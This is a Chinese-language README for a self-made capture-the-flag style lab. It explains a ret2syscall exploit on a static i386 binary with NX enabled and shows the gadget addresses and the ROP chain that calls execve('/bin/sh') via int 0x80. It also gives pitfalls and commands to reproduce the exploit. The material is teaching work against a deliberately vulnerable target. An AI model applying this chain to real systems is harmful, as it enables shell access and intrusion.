# lab_ret2syscall_i386 —— 自造 ret2syscall 靶场（L2）

> **这是自造实验，不是真实赛题。** 目的：在**完全没有 libc** 的前提下，只靠
> `pop reg; ret` + `int 0x80; ret` 把 `execve("/bin/sh", NULL, NULL)` 拼出来。

---

## 1. 题目行为

```text
$ ./chal
name:        <- read(0, bss_buf, 8)     固定 8 字节，正好放 "/bin/sh\0"
exploit:     <- read(0, esp, 0x400)     栈溢出，缓冲区就是当前栈顶
             ret                        返回地址直接取 [esp]
```

保护（`checksec`）：

| 项 | 值 |
| --- | --- |
| 架构 | i386，**静态**（as + ld，无 libc） |
| PIE | 无（`ET_EXEC`，基址 `0x8048000`） |
| NX | **开启**（`PT_GNU_STACK = RW`） |
| canary | 无 |
| RELRO | No RELRO（没有 GOT） |

gadget（`nm chal`，地址随源码稳定）：

```text
0x8049050  gadget_int80_ret      int 0x80 ; ret
0x8049053  gadget_pop_eax_ret    pop eax ; ret
0x8049055  gadget_pop_ebx_ret    pop ebx ; ret
0x8049057  gadget_pop_ecx_ret    pop ecx ; ret
0x8049059  gadget_pop_edx_ret    pop edx ; ret
0x804b010  bss_buf               0x100 字节可写（.data，文件映射，保证可写）
```

> `exp.py` 不写死地址，直接用 `ELF(bin).symbols[...]` 取，改源码也不会失配。

## 2. 为什么是 ret2syscall 而不是别的

| 排除项 | 原因 |
| --- | --- |
| ret2text | 没有后门函数，唯一分支就是 `ret` |
| ret2shellcode | NX 开启，栈/数据段都不可执行 |
| ret2libc | 静态链接，没有 libc，也没有 `system`/`/bin/sh` |
| SROP | 有 `pop rax` 也能做，但本 lab 的定位是"参数 gadget 齐全的纯 syscall 链" |

## 3. 利用链

```text
name 阶段   send("/bin/sh\0")            -> bss_buf

exploit 阶段
  pop eax ; 11                           # __NR_execve
  pop ebx ; &bss_buf                     # filename
  pop ecx ; 0                            # argv  = NULL
  pop edx ; 0                            # envp  = NULL
  int 0x80
```

偏移是 **0**：`read` 直接写当前 `esp`，payload 第一个 dword 就是返回地址。

## 4. 坑点

1. **i386 的 `read` 系统调用号是 3**，不是 0。写 `xor eax,eax; int 0x80` 会调
   `restart_syscall`，返回 `-EINTR`（表现为"两个提示立刻打完就崩"）。这个坑是
   本次实测踩到的，源码里留了注释。
2. `.bss` 段在裸 `ld` 下可能生成 `Offset=0x10 / Vaddr=0x804b010` 这种不满足
   `p_vaddr ≡ p_offset (mod 0x1000)` 的 LOAD 头，内核直接不映射 → `read` 返回
   `-EFAULT`。所以可写区放在 `.data`（文件映射）而不是 `.bss`。
3. 必须写 `.section .note.GNU-stack,"",@progbits`，否则栈可能被标成可执行，
   题目就退化成 ret2shellcode。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn_Writeups/labs/lab_ret2syscall_i386'
source ../../.venv/bin/activate
make            # as --32 + ld -m elf_i386，不需要 gcc-multilib
python exp.py   # 期望输出 __PWNED__ 与 uid=...
```

## 6. 识别卡

```text
静态/无 libc + 有 pop eax/ebx/ecx/edx + int 0x80
  -> ret2syscall：自己摆 execve 的 5 个要素（eax=11, ebx=路径, ecx=argv, edx=envp, int 0x80）
区别：sandbox_seccomp 是 execve 被拦后改 ORW；这里没有沙箱，直接 execve
```
